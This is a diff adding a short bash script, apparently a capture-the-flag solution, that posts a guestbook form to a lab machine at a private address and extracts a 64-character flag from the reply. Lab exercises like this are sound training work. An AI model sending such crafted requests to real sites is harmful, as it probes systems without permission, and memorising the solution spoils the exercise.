@@ -1,0 +1,3 @@
+#!/usr/bin/bash
+
+curl -s -X POST "http://192.168.56.101/?page=feedback" --data "txtName=test&mtxtMessage=s&btnSign=Sign+Guestbook" | grep -oP 'The flag is : \K[0-9a-f]{64}' | head -1
